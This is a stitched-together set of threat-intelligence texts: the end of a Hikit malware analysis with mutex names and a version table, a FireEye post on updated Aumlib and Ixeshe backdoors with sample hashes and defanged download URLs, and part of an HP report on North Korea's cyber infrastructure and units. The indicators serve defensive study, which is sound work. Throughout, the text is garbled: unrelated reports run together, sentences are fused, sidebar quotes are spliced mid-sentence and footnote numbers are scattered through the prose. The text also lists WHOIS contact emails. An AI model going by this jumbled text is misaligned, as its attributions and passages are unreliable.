a signature difficult.Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0
and Gen 1.1.From a system objects perspective, Gen 2 samples produce up to three named events.The event
names change per infection, but have a common format.The following three strings represent the
known mutex strings for Gen 2 samples:
                                        Global\%s__SHOW__
                                        Global\%s__HIDE__
                                        Global\%s__STOP__
	
  

where the %s format variable is replaced with a UUID value string specific to the infected machine.Appendix A: HiKit Versions

       Generation   Starting Date      Notable Features
       Identifier
       Gen 1.0      31 March 2011      First known Hikit samples.Stand-alone console executable.Gen 1.1      18 April 2011      Uses DLL and driver model.Gen 2.0      28 August 2011     First client-based Hikit variants.Stand-alone console
       Alpha                           executable.Does not use a device driver.Encrypted
                                       communication.Gen 1.2      23 October 2011    Command “socks5” changes to “proxy”.Encrypted
                                       communication.Gen 2.0      27 February 2012   Introduces the use of the device driver.Beta
       Gen 2.1      17 April, 2012     First known production variant of the Gen 2 family.Uses the
                                       concept of the Loader, the DLL and the Driver as a complete
                                       system.Gen 2.2      21 February 2013   Changes storage location for configuration file.Largely similar
                                       to Gen 2.1.DLL-based and executable-based loaders.Largest
                                       in-service time span.Gen 2.3      12 December        Significantly more advanced authentication when doing intra-
                    2013               malware communication.Use of SSL certificate during
                                       handshake.Survival of the Fittest: New York Times Attackers Evolve Quickly
The attackers behind the breach of the New York Times’ computer network late last year appear to be
mounting fresh assaults that leverage new and improved versions of malware.The new campaigns mark the first significant stirrings from the group since it went silent in January in the
wake of a detailed expose of the group and its exploits — and a retooling of what security researchers
believe is a massive spying operation based in China [1].The newest campaign uses updated versions of Aumlib and Ixeshe.Aumlib, which for years has been used in targeted attacks, now encodes certain HTTP communications.FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization
involved in shaping economic policy.And a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new
network traffic patterns, possibly to evade traditional network security systems.The updates are significant for both of the longstanding malware families; before this year, Aumlib had
not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.BACKGROUND

Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network
defenses.But, larger, more successful threat actors tend to evolve at a slower rate.As long as these actors regularly achieve their objective (stealing sensitive data), they are not motivated to
update or rethink their techniques, tactics, or procedures (TTPs).These threat actors’ tactics follow the
same principles of evolution – successful techniques propagate, and unsuccessful ones are abandoned.Attackers do not change their approach unless an external force or environmental shift compels them to.As the old saying goes: If it ain’t broke, don’t fix it.So when a larger, successful threat actor changes up tactics, the move always piques our attention.Naturally, our first priority is ensuring that we detect the new or altered TTPs.But we also attempt to
figure out why the adversary changed — what broke?— so that we can predict if and when they will
change again in the future.We observed an example of this phenomenon around May.About four months after The New York Times
publicized an attack on its network, the attackers behind the intrusion deployed updated versions of their
Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families [2].The previous versions of Aumlib had not changed since at least May 2011, and Ixeshe had not evolved
since at least December 2011.We cannot say for sure whether the attackers were responding to the scrutiny they received in the wake of
the episode.But we do know the change was sudden.Akin to turning a battleship, retooling TTPs of large
threat actors is formidable.Such a move requires recoding malware, updating infrastructure, and possibly
retraining workers on new processes.The following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe.Backdoor.APT.Aumlib

Aumlib has been used in targeted attacks for years.Older variants of this malware family generated the
following POST request:

POST /bbs/info.asp HTTP/1.1

Data sent via this POST request transmitted in clear text in the following structure:

<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|

A recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a
modified variant of Aumlib.The sample, which was deployed against an organization involved in shaping economic policy, was
downloaded from the following URL:

status[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css

The sample generated the following traffic:




This output reveals the following changes when compared with earlier variants:

      The POST URI is changed to /bbs/search.asp (as mentioned, earlier Aumlib variants used a POST
      URI of /bbs/info.asp.)The POST body is now encoded.Additional requests from the sample generated the following traffic:




These subtle changes may be enough to circumvent existing IDS signatures designed to detect older
variants of the Aumlib family.The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash
cb3dcde34fd9ff0e19381d99b02f9692.The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to
documents[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a
POST request to /bbs/info.asp.Backdoor.APT.Ixeshe

Ixeshe has been used in targeted attacks since 2009, often against entities in East Asia [3].Although the
network traffic is encoded with a custom Base64 alphabet, the URI pattern has been largely consistent:

/[ACD] [EW]S[Numbers].jsp?[Base64]

We analyzed a recent sample that appears to have targeted entities in Taiwan, a target consistent with
previous Ixeshe activity.This sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the
earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe
related infections.The Base64-encoded data still contains information including the victim’s hostname and IP address but
also a “mark” or “campaign tag/code” that the threat actors use to keep track of their various attacks.The
mark for this particular attack was [ll65].CONCLUSION

Based on our observations, the most successful threat actors evolve slowly and deliberately.So when they
do change, pay close attention.Knowing how attackers’ strategy is shifting is crucial to detecting and
defending against today’s advanced threats.But knowing the “why” is equally important.That additional
degree of understanding can help organizations forecast when and how a threat actor might change their
behavior — because if you successfully foil their attacks, they probably will.Notes
[1] http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-
computers.html?pagewanted=all

[2] This actor is known as APT12 by Mandiant

[3] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-
papers/wp_ixeshe.pdf

This entry was posted in Threat Intelligence, Threat Research by Ned Moran and Nart Villeneuve.Bookmark the permalink.The information contained herein is subject to change without notice.The only warranties for HP
products and services are set forth in the express warranty statements accompanying such products and services.Nothing herein should be construed as constituting an
additional warranty.HP shall not be liable for technical or editorial errors or omissions contained herein.In this
edition we discuss the cyber landscape within the Democratic People’s
Republic of Korea.Introduction
The Democratic People’s Republic of Korea (DPRK), known in the West as North Korea, is a unique
country with a military-focused society and an unconventional technology infrastructure.While
North Korea was formerly on the U.S. list of state sponsors of terrorism, it was removed in 2008.According to a 2009 report by Major Steve Sin, an intelligence analyst at U.S.Forces
Korea, North Korean hackers have successfully penetrated U.S. defense networks more
frequently than any other country that has targeted U.S. defense assets.7 While Major Sin may
have been overly optimistic about North Korea’s abilities, it is clear that they should not be
underestimated.While the U.S. views North Korea’s cyber warfare program as the regime’s foray into modern
asymmetrical warfare, South Korea views the regime’s cyber capabilities as a terroristic threat, -a
build-up for an impending multifaceted attack.It is important to note that, to date, no such attack
has occurred.12 While this claim may be exaggerated, in 2012, South Korean reports estimated North
Korea’s hacker forces at around 3000 personnel.In a July 2014 report from South Korea’s Yonhap
News Agency, that figure was upgraded to 5900 hacker elite.13 We must stress that although
these claims have not been corroborated, South Korea has taken the regime’s cyber threats very
seriously and is reportedly training 5000 personnel to defend against North Korean cyber
attacks.14

Obtaining details on North Korea’s cyber warfare capabilities is not an easy task.This paper will
examine the known cyber capabilities of North Korea’s regime and how the country maintains
secrecy in these matters.Through information obtained via open source intelligence (OSINT), we
will present what is known about North Korea’s cyber warfare and supporting intelligence and
psychological operations capabilities.Research roadblocks
The following conditions proved to be research roadblocks when gathering intelligence regarding
North Korea’s cyber warfare capabilities:
     Much of the intelligence available on North Korea is dated and may not accurately reflect
        the regime’s current capabilities. Much of the intelligence available on North Korea comes from U.S. or South Korean
        military or agency reports.These reports omit details that are likely classified, such as
        specific IP addresses and individual actor information. While South Korea is an ally of the United States, its reports on North Korean cyber
        activity potentially contain incomplete or biased information.15 16
          North Korea’s Internet infrastructure and the regime’s strict control over its use ensures
           that there are no rogue actors and that all officially sanctioned actors exercise careful
           OPSEC and PERSEC practices in order to prevent inadvertent information leaks.In other
           words, there was no significant identifying information in the form of an OSINT trail left
           behind by the actors.This hinders collection of original, actionable threat intelligence and
           individual actor attribution.     North Korea is well-isolated from the outside world, and its strong intelligence and
           psychological operations presence effectively creates confusion via counterintelligence
           and disinformation about the regime’s capabilities.17 For this reason, any “official” reports
           emanating from North Korea must be taken with a grain of salt.This also hinders
           attempts to obtain original, actionable threat intelligence.Ideological and political context
In order for Westerners to understand the North Korean mindset, it is necessary to examine the
key components of North Korean political and ideological thought.It is also necessary to provide a
brief explanation of how North Korea and South Korea view one another, in order to understand
the basis for conflict between the two.Juche and Songun
North Korea has two primary ideologies that provide context for the regime’s motivations and
activities: juche (ju-cheh) and songun (sun-goon).Juche is the official political ideology of North
Korea.It was instituted in 1972 and is based on the ideologies of Kim Il-Sung, the founder of the
DPRK.Juche emphasizes self-reliance, mastering revolution and reconstruction in one’s own
country, being independent of others, displaying one’s strengths, defending oneself, and taking
responsibility for solving one’s own problems.North Korea’s air-gapped intranet, described below,
exemplifies this philosophy in the country’s cyber infrastructure.The juche philosophy explains
North Korea’s disdain for outside cultural and political influence.Juche challenges North Koreans
to contribute to the regime’s chaju (ja-ju), a concept of national sovereignty and independence.18
The regime’s greatest fear is internal dissent and resulting destabilization.19 20 In a June 2014
Reddit AMA session, Dr. Andrei Lankov, an expert on North Korean culture and society, noted
“there are also serious signs of public alienation and discontent.And I cannot rule out a public
outbreak of such discontent in the near future.Of course, if it happens, it will have a serious
impact on the government.”21 Despite North Korea’s strong conviction in juche, the regime
collaborates with and receives support from other nations.North Korea also
collaborates with China and Russia to train its cyber warriors and has longstanding political and
military relationships with several nations.Songun is North Korea’s “military first” doctrine.Songun emphasizes the priority of the military in
resource allocation and political and economic affairs.23 This doctrine stems from the belief that
the military is vital for preservation of chaju.24 Understanding songun mindset gives context for
this potential threat actor’s motivations.According to a 2013 Congressional report, the strategy
established under former leader Kim Jong-Il focused on “internal security, coercive diplomacy to
compel acceptance of its diplomatic, economic and security interests, development of strategic
military capabilities to deter external attack, and challenging South Korea and the
U.S.-South Korean alliance."25                                                            Songun is North Korea’s
                                                                                                                               “military first” doctrine.North Korea’s songun permeates the lives of all North Korean citizens.Understanding this
fourth largest in the world.The country’s reserve and paramilitary units comprise                                             mindset gives context for a
                                                                                                                               potential threat actor’s
7.7 million additional personnel.27 In other words, over a third of the country’s
                                                                                                                               motivations.population serves in a military or paramilitary capacity.Some North Korean youth aged 7-13 are inducted into the Korean Children’s Union.Beginning at age 17, North Koreans are eligible to join the Reserve Military
Training Unit.31 The Reserve Military Training Unit forms the core of North Korea’s reserves and is
typically assigned to the front or regional defense in wartime.32 The youngest age at which a
citizen can be conscripted for active duty is unclear; reported ages range from 18-20.The regime’s sea weaponry includes 70 submarines, 420 patrol combatants, and 260 amphibious
landing craft.Their airpower includes 730 combat aircraft, 300 helicopters, and 290 transport
aircraft.While the limits of the regime’s ballistic missile program are unknown, North Korea is
thought to have fewer than 100 short-range missiles and fewer than 100 medium to long-range
missiles.36 However, in recent years, North Korea has suffered oil,37 fuel,38 electricity,39 and food40
shortages.Without aid from another entity, the regime does not have sufficient resources to
maintain and sustain the majority of its weapons and associated personnel for rapid deployment
or prolonged combat.Tension and change on the Korean Peninsula
Tension between North and South Korea has continued well past the armistice meant to end the
Korean War.Neither nation recognizes the other as a legitimate state.South Korea’s constitution
legally defines South Korean territory as the entire Korean peninsula and its adjacent islands, with
“North Korea” being a part of South Korea.41 North Korea also claims to be the sole government
of the Korean Peninsula.42 Each country’s claim of sovereignty and refusal to acknowledge the
other as a legitimate state creates the condition for perpetual conflict.North Korea’s negative
sentiment towards the U.S. stems from two major factors: the U.S. – South Korea military alliance
and North Korea’s perception that the U.S. is imperialistic and prone to exploitative capitalism.Kim Jong Un officially rose to power in
April 2012, following the death of his father Kim Jong Il in December 2011.While his age
remained a mystery for quite some time, it was later revealed that he was born in January 1983,
making him age 31 at present.This makes Kim Jong Un the world’s youngest leader of an
established nation.44 The young leader’s rise to power brought about several changes in North
Korea.First, Kim Jong Un’s personal life is more public and more extravagant than that of his
father.Unlike his father, the young Kim is often accompanied by his wife when making public
appearances.45 Second, the young Kim, who is more high-tech than his predecessor, is reported to
have an affinity for luxury items46 and is an avid gamer and basketball fan.47 Third, Kim Jong Un is
more totalitarian than his father.Following his rise to power, the regime reportedly expanded its
labor camps, and more military resources were allocated to target those attempting to defect.Kim also executed his own uncle, a high-ranking official who did not share his ideals.These moves
indicate the regime’s priority to deter internal destabilization and dissent, which is perceived to be
a greater threat than outside adversity.According to Phil Robertson, deputy Asia director at
Human Rights Watch, “The government now recognizes that the accounts of escaping North
Koreans reveal Pyongyang’s crimes – so it is doing what it can to stop people from fleeing.”48
Under Kim Jong Un’s rule, the regime has stepped up its nuclear materials production, and the
propaganda distributed by state media has become more menacing.49

The regime’s response to perceived threats has also become more volatile.Christian Whiton, a
former deputy envoy to North Korea, noted that following Kim Jong Un’s rise to power, “the
regime still acts in a very belligerent manner, but it seems less predictable, and more random.”
Ellen Kim, assistant director of the Korea Chair at the Center for Strategic and International
Studies, assessed the situation thusly: “Since [Kim Jong Un] took power he has purged almost all
of his elder guardians ... and filled his surroundings with new faces.We are in a situation where we
are learning about him a little bit every day through his unpredictable behavior and actions, which
is why the current situation with North Korea is a lot more dangerous than before.”50 The regime’s
recent reaction to an upcoming film supports these statements.The plot for the comedy film “The
Interview” follows two talk show hosts who are asked to assassinate Kim Jong Un.While tensions between North and South Korea have persisted since the Korean War, these
tensions escalated following the 2013 inauguration of South Korea’s current president, Park Geun
Hye.Her platform, in her words, is as follows: “North Korea must keep its agreements made with
South Korea and the international community to establish a minimum level of trust, and second
there must be assured consequences for actions that breach the peace.North Korea’s outward-facing Internet connection is
only available to select individuals and is closely monitored for any activity that is deemed anti-
regime.Individuals using the outward-facing Internet connection must be authorized.In 2013,
Jean H. Lee, the Associated Press bureau chief in Pyongyang, stated that foreigners visiting North
Korea are allowed Internet access with no firewalls.56 Common citizens are limited to using the
Kwangmyong (gwang me-young), a nationwide intranet with no access to the world outside North
Korea.Star Joint Venture Co. is responsible for providing North Korea’s Internet access.Previously, Internet access was provided by a German satellite link via
Korea Computer Center Europe or via direct connections with China Netcom, which was later
merged into China Unicom.62 By October 2010, North Korea had made its first known direct
connection to the Internet, hosting an outward-facing Korean Central News Agency website
accessible from the global Internet.63 However, many of North Korea’s globally accessible
websites are hosted in other countries.In the
blog post, the author noted his method for proving that The Pirate Bay was not hosted in North
Korea.While his analysis of The Pirate Bay’s hosting is irrelevant to our research, he did detail that
175.45.177.0/24 always routes through AS4837, and AS131279.AS131279 is Star-KP, North
Korea’s Star Joint Venture Company, and AS4837 is China Unicom.The author concluded that “all
[traffic] is ONLY routed through China Unicom and NOT through Intelsat.”67 In February 2014,
North Korean and South Korean officials agreed to extend Internet access to Kaesong Industrial
Zone, a jointly operated industrial complex just north of the border.Koryolink, the country’s only cellular phone network,72 is tightly controlled by the regime.73 Cell
phone data plans are not available to most users.Most cellular phones cannot access the
Internet and can only make domestic calls.74 According to a 2013 report, North Korea has a 3G
data network for cellular phones.Visiting reporter Jean H. Lee purportedly used this 3G network
to post to both Twitter and Instagram.However, citizens are not generally allowed to use the 3G
network.75

Email is also regulated by the regime.The first email provider in North Korea was Silibank.Silibank
has servers in Pyongyong and Shenyang and is a joint venture with China.The North Korean
Silibank homepage is silibank.net, and the Chinese homepage is silibank.com.In order to use the
email service, users had to initially register, provide personal information, and pay a registration
fee and monthly service fees.76 This registration information was current as of 2001.However, it
is unknown whether the same process still applies.WHOIS records for silibank.net show that the site was registered anonymously via a Japanese
registrar.This information can be found in Appendix A at the end of this paper.KCC has eleven regional information centers and eight development and
production centers.Other countries with KCC branch offices include China, Syria, Germany, and
United Arab Emirates.KCC has a vested interest in Linux research and is responsible for the
development of North Korea’s national operating system, Red Star OS, which is discussed in more
detail below.KCC’s other projects have included a proprietary search engine, a document writer, a
game called Jang-Gi, the Kwangmyong intranet, a food study program, a Korean input method
editor, a pen-based English-Korean and Korean-English translator, Korean voice recognition
software, a video conferencing system, a distance education system, SilverStar Paduk software,
HMS Player77, and the Samjiyon tablet.78 In addition to research and development, KCC also
monitors websites of foreign government and business entities and conducts technical
reconnaissance to blueprint the technical specifications and vulnerabilities in foreign systems and
technologies.KCC has also been involved in clandestine information and cyber operations, serving
as a command center.79

North Korea’s proprietary operating system is Red Star OS.The development of this Linux-based
operating system started in 2002.Red Star OS is only offered in the Korean language and
features proprietary software including Naenara (a Firefox-based browser), as well as a text
editor, email client, audio and video players, and games.80 Red Star OS’s keyboard layouts include
Korean, English, Russian, Chinese, and Japanese.Regime ideals extend to Red Star OS.The
readme file, which goes with the installation disc, reportedly includes a quote from Kim Jong-Il
regarding the importance of North Korea having its own Linux-based operating system that is
compatible with Korean traditions.While prior versions of Red Star were KDE-based, version 3.0
mimics Apple’s OS X.81 82 This could indicate the regime leader Kim Jong Un’s preference for the
OS X environment, as Kim reportedly uses an iMac.83 Citizens do not need permission to obtain
Red Star OS.However, the purchase of computers is heavily regulated.84 The OS’s design suggests
it was developed with means for the regime to monitor user activity.85

North Korea is known to use two IP ranges.175.45.176.0/22 is North Korea’s own IP block.86
Additionally, North Korea’s Telecommunications Ministry is the registered user of China Unicom IP
range 210.52.109.0/24.87 The country’s only autonomous system (AS) number is AS131279, and
its only peer is AS4837, the AS for China Unicom.88

North Korea’s country code top-level domain (ccTLD) is .kp.In
light of this, North Korea has managed to develop both hardware and software and hosts an
annual National Exhibition of Invention and New Technologies to promote its products.92 However,
the regime has historically failed in its attempts at large-scale production of electronic
components.An analysis of developments in North Korean cyberspace since 2010
A comparison of a scan97 of North Korea’s IP ranges in November 2010, just one month after
North Korea made its first direct connection to the Internet, and a series of several scans we
conducted in May 2014, shows that North Korea has made significant headway in establishing its
Internet presence.In the November 2010 scan, 175.45.176.0 - 175.45.176.16 showed a variety of devices including
D-link, Cisco, Linksys, HP, and Nokia devices, and a Juniper networks firewall.Operating systems
detected included FreeBSD 6.x, Linux 2.6.x, and Red Hat Enterprise Linux.175.45.176.14 returned
“Naenara” as an html-title.Most hosts in the 175.45.176.xx and 175.45.177.xx ranges were
down.As of 2014, IP addresses 175.45.176.0 - 175.45.177.255 appear to be used for websites,
nameservers, databases, email, and voice over IP (VoIP).This comparison
demonstrates that there has been some growth in DPRK Internet infrastructure over the past four
years.However, it seemingly lags behind even most third world nations.The 2014 scans detected
dated technology that is potentially susceptible to multiple vulnerabilities and consistently
showed the same open ports and active devices on scanned hosts.It is not clear whether the
regime failed to notice and react to the scanning or whether the regime allows these open ports
and devices to be detected or spoofed to serve as a distraction or possible honeypot.Domains, nameservers, and mail servers present during the May 2014 scan are listed in Appendix
B at the end of this report.According to Alexa rankings, the three most visited websites in North Korea are kcna.kp, the
official website of the Korean Central News Agency (KCNA)100; rodong.rep.kp, another North
Korean news site101; and naenara.com.kp, North Korea’s official web portal.102 Naenara translates
to “my country”.The kcna.kp site was registered using a Loxley.co.th email address and is administrated by Star
Joint Venture Company.The WHOIS Record can be found in Appendix A.100
    http://dig.do/kcna.kp
101
    http://dig.do/rodong.rep.kp
102
    http://dig.do/naenara.com.kp
Figure 4 A screenshot from the kcna.kp homepage.103


Rodong.rep.kp was registered using the same loxley.co.th email address and is also administered
by Star Joint Venture Company.The WHOIS Record for this site can be found in Appendix A.103
      http://kcna.kp/kcna.user.home.retrieveHomeInfoList.kcmsf
Figure 5 A screenshot from the rodong.rep.kp homepage.104

The WHOIS information for Naenara.com.kp was not available.Several major North Korean websites are hosted outside of North Korea.The popular
Uriminzokkiri.com website, whose name translates to “our nation,” is hosted in China.The
administrative contact for the website is Kim Sejun, and the email address given as contact
information is hyk1979@hotmail.com.The WHOIS Record for this site can be found in Appendix A.108
      http://www.nkeconwatch.com/2013/03/25/chrome-blocking-naenara/
Figure 9 A screenshot of the Uriminzokkiri website 109

The website for Kim Il Sung Open University, otherwise known as “Our Nation School” is also
hosted in China.The WHOIS record for this site can be found in Appendix A.109
      http://www.uriminzokkiri.com/
Figure 10 A screenshot of ournation-school.com.110


North Korean cyber war and intelligence structure
At the top of North Korea’s military structure is the National Defense Commission (NDC).The NDC
is also the highest branch of government and the regime’s supreme policymaking body.111 Along
with the Central Committee of the Workers’ Party of Korea and the Cabinet, NDC is at the top of



110
      http://www.ournation-school.com/
111
      https://nkleadershipwatch.wordpress.com/dprk-security-apparatus/national-defense-commission/
North Korea’s political hierarchy.112 Article 106 of North Korea’s Constitution gives the NDC the
following powers:113
      The power to establish policies of the state in accordance with the military-first
        revolutionary line. The power to guide the armed forces and oversee defense building. The power to supervise and ensure the NDC and its chairman’s orders are executed and to
        establish necessary measures. The power to override any state decisions or directives that are in opposition to the NDC
        or its chairman’s decisions and directives. The power to create or remove central organs of the national defense sector. The power to create and bestow military titles above general-grade officer rank.The NDC oversees several defense and intelligence bodies including the Ministry of State Security,
the Ministry of People’s Security, the Ministry of People’s Armed Forces, and the Korean People’s
Army.The Ministry of State Security (MSS), also known as the State Security Department, is North
Korea’s primary counterintelligence service.It is considered an autonomous agent of the regime
and reports directly to leader Kim Jong Un.The MSS’s duties include oversight of North Korean
prison camps, investigation of domestic espionage, repatriation of defectors, and overseas
counterespionage operations.114 The Ministry of People’s Security is also known as the Ministry of
Public Security (MPS).The General         intelligence component and
Staff Department also oversees the Reconnaissance General Bureau (RGB), North      an attack component.One of
                                                                                   Unit 121’s command posts is
Korea’s agency for clandestine operations.The RGB has a role in both traditional
                                                                                   Chilbosan Hotel in Shenyang,
and cyber operations.In the past, the RGB has sent agents on overseas military    China.91 Office and Unit 121.The No.91 Office, an office    viruses on enemy networks.Unit
121’s headquarters is in the Moonshin-dong area of Pyongyang, near the Taedong River.121 It also
has components that conduct operations from within China.One of Unit 121’s command posts is
Chilbosan Hotel122 in Shenyang, the capital of Liaoning Province, which borders North Korea.123
Shenyang is a Chinese military district.124 According to Dr. Alexandre Mansourov, an expert on
North Korea and a visiting scholar at the U.S.-Korea Institute at Johns Hopkins University, "They
[Unit 121] are believed to have conducted hacking operations from inside China that falsify
classified data and disrupt U.S. and South Korean systems.(2012).Cyber war: The next threat to national security and what to do about it.New York, NY: Ecco.128
    maps.google.com
Figure 12 A satellite view of the Chilbosan Hotel.129

Several entities are nested under the Workers’ Party.The Central Party
Committee oversees the Central Party Investigative Group, also known as Unit          The Unification Bureau falls
35.Unit 35 is reportedly responsible for technical education and training of
    130                                                                               under the Workers’ Party.Its
                                                                                      Operations Department is
cyber warriors.The Unification Bureau’s Operations Department is
                131                           132
                                                                                      responsible for cyber-
responsible for cyber-psychological warfare, organizational espionage, and            psychological warfare,
oversight of Unit 204.Unit 204’s responsibilities include planning and execution     organizational espionage, and
of cyber-psychological warfare operations and technological research.The             oversight of Unit 204.The
creation of underground political parties in order to incite disorder and revolution.Psychological Operations
It plays a more traditional intelligence and psychological operations role, rather    Department of the North Korea
                                                                                      Defense Commission also
than focusing on cyber operations.134 The United Front Department (UFD)               engages in cyber-psychological
conducts overt operations to create pro-North Korean groups in South Korea.warfare.Examples of this activity include the Korean Asia-Pacific Committee and the
Ethnic Reconciliation Council.The UFD also manages inter-Korean dialogue and North Korea’s
policy toward South Korea.Its operations are also more traditional rather than cyber-focused.135




129
    maps.google.com
130
    Clarke, R. A.(2012).Cyber war: The next threat to national security and what to do about it.New York, NY: Ecco.This group, which was
established in 1955, is referred to by various names including the Chosen Soren, Chongryon, and
the General Association of Korean Residents in Japan.136 The Chongryon ascribe to juche and seek
to preserve North Korean culture while living in Japan.They operate North Korean style schools
and refuse to assimilate with Japanese culture.137 According to Mitsuhiro Suganuma, former
section head of the second intelligence department of the Japanese Public Security Intelligence
Agency (PSIA), “Chongryon is virtually under the direct control of the Liaison Department of the
Workers’ Party of Korea, which has been in charge of North Korea’s covert operations and
underground activities against South Korea.One example is Unikotech, which was formed to sell KCC products             under the direct control of
abroad.operations and
                                                                                                                                    underground activities
The regime also has several government bodies under the Cabinet142 that oversee             against South Korea.”
its infrastructure, intelligence, and technological development.These include the
Central Scientific and Technological Information Agency (CSTIA), the Ministry of Electronics
Industry, and the Ministry of Posts and Telecommunications.The CSTIA collects, analyzes, and
processes data regarding advanced science and technology then sends relevant information to
appropriate areas of the national economy.143 The amount of information contained in CSTIA's
technical database makes it North Korea's largest scientific facility.According to a CIA article,
review of CSTIA’s publications showed that China, Russia, and Japan are important sources of
technical data.However, based on cultural and
technical observations, we may deduce that North Korea’s cyber doctrine follows the tenets of
juche nationalism and the songun doctrine.Although North Korea’s limited online presence makes a thorough analysis of their cyber warfare
capabilities a difficult task, it must be noted that what is known of those capabilities closely
mirrors their kinetic warfare tactics.Cyber warfare is simply the modern chapter in North Korea’s
long history of asymmetrical warfare.North Korea has used various unconventional tactics in the
past, such as guerilla warfare, strategic use of terrain, and psychological operations.146 The
regime also aspires to create viable nuclear weapons.147 Asymmetrical warfare is defined as “a
conflict in which the resources of two belligerents differ in essence and in the struggle, interact
and attempt to exploit each other's characteristic weaknesses.Such struggles often involve
strategies and tactics of unconventional warfare, the ‘weaker’ combatants attempting to use
strategy to offset deficiencies in quantity or quality”.148

According to the aforementioned report to the House Armed Service Committee, “Cyber warfare is
an important asymmetric dimension of conflict that North Korea will probably continue to
emphasize — in part because of its deniability and low relative costs.”149 North Korea’s poor
economic state150, further explains the regime’s reliance on these tactics.In 2014, the regime
reportedly spent 16% of its budget on defense.151 The North Korean military places a strong
emphasis on information warfare capabilities including political and psychological warfare152 and
cyber or hacker warfare.153

The report by Capt.   North Korea’s school systems place a strong emphasis on math, giving the nation
          confidence in its programmers, cryptographers, and security researchers.   In the modern warfare landscape, cyber capabilities are potentially more utilitarian than
          heavy artillery or aircraft.   Cyber warfare capabilities provide a platform for espionage, psychological operations,
          and other forms of non-kinetic warfare.   Considering the separatist nature of North Korea’s infrastructure, cyber warfare provides
          a strategic advantage since outbound attacks are possible, but inbound attacks would
          have limited reach.   Cyber warfare allows North Korea to leverage the Internet’s inherent flaws for offensive
          purposes while maintaining its defenses, primarily via air-gapping its most critical
          networks from the outside world.In June 2006, an attack on the U.S.
State Department originating in the East Asia-Pacific region coincided with U.S.-North Korea
negotiations over the regime’s nuclear missile testing.164 A month later, a South Korean military
report implicated North Korea’s Unit 121 in hacking the South Korean and U.S. Defense
Departments.North Korea also tested a logic bomb in October 2007.code programmed to execute based on a pre-defined triggering event.Following the logic bomb
test, the UN passed a resolution banning sales of certain computer hardware to North Korea.165

North Korea considers its cyber warfare capabilities an important asymmetric asset in the face of
its perceived enemies, the U.S. and South Korea.While North Korea does not have an immersive
digital culture, both the U.S. and South Korea are heavily dependent upon technological
infrastructure for social, economic, and political stability.166 For this reason, a cyber attack that
cripples or compromises the reliability of the U.S. or South Korea’s technological infrastructure
could have a far-reaching impact.Gaming for profit and pwnage
North Korea has reportedly used computer games for both illegal capital gain and
                                                                                               North Korea has used
orchestrating cyber attacks.In 2011, South Korean police arrested five individuals,
                                                                                               computer games for both
including one Chinese national, for allegedly collaborating with North Korean hackers          illegal capital gain and
affiliated with the Korea Computer Center to steal money via online games.167                  orchestrating cyber attacks.According to South Korean reports, the culprits used an auto-player to quickly
progress in the massively multiplayer online role-playing game (MMORPG) “Lineage” and were
able to use the game’s market to obtain real currency.168 In 2013, South Korean officials released
information stating they had found evidence that North Korea was using games as a medium for
infecting machines and launching cyber attacks.North Korea had used game downloads to infect
100,000 South Korean machines for a botnet used to launch a distributed denial of service (DDoS)
attack against Incheon Airport.169 This clever tactic sought to leverage a seemingly innocent game
as a force multiplier in order to amplify the effects of a DDoS attack on a critical infrastructure
target.However, in this case, there was little impact on the target.Intelligence and counterintelligence
North Korea’s intelligence program is one of its strongest military assets, providing foundational
support for all other military operations.The regime’s cyber warfare capabilities, in particular, rely
heavily on open-source intelligence (OSINT) collection and cyber-espionage.170 As noted in a CIA
publication, "It is a significant irony of our information age that open-source intelligence is
contributing to the survival and development of one of the world's most secretive regimes."171
Historically, the primary goals of the regime’s intelligence program included collection and
dissemination of intelligence concerning any possible political, military, or economic threat to the
regime’s security and stability."172

North Korea has a broad reach for intelligence collection, which extends to cyber intelligence.173
In April 2013, Solutionary, a company providing managed security services, reported a marked
increase in both overt attacks and information gathering attempts originating from
North Korean IPs.As a baseline, Solutionary noted that typically only 200 incidents per         cyber and intelligence
month are traced to North Korean origin.This is an interesting claim, considering
                                           174                                              programs.that attacks attributed to North Korea are usually routed through other countries.As mentioned above, a faction of ethnic North Koreans residing in Japan, known as the Chongryon,
are critical to North Korea’s cyber and intelligence programs and help generate hard currency for
the regime.The Chongryon headquarters has been recognized as the de facto North Korean
embassy in Japan.Ikeguchi is one of the Chongryon‘s
many ties to organized crime.Ikeguchi was arrested in the past for an attempted coup against the
Japanese government.He also has ties to the political group Nihon Seinensya, which is involved in
illegal activities in conjunction with the yakuza syndicate Sumiyoshi-kai, which imports and sells
amphetamines made in North Korea.177 North Korea also has black market ties to Sumiyoshi-kai’s
rival syndicate, Yamaguchi-gumi.Many members of the Kodo-kai, Yamaguchi-gumi’s ruling
faction, are Korean-Japanese, with ties to North Korea.178 Masahiro Namikawa, leader of the drug
trafficking Seido-kai yakuza organization, also has ties to the Chongryon.179

The Chongryon operate at least two websites, chongryon.com, which is in Japanese, and korea-
np.co.jp.WHOIS records for chongryon.com indicate that it was registered by “guanin o” using the email
address park2@mac.com.The WHOIS information for korea-np.co.jp.shows that it was
registered by Choson Shinbo Company Inc.The WHOIS records for these sites can be found in
Appendix A.

Additionally, the Chongryon operate a ferry called the Mangyongbong-92, the only direct transit
from Japan to North Korea.In 2003, they were suspected of using the ferry to smuggle missile
parts.180 In 2006, the ferry was temporarily banned from Japanese waters when Japanese officials
discovered the Chongryon were using it to smuggle dual-use electronics to North Korea to be
used for military purposes.181

North Korea has a global network of state-run businesses located in 30 to 40                                                  North Korea has a global
countries that is used for espionage activities.The Reconnaissance General Bureau                                            network of state-run
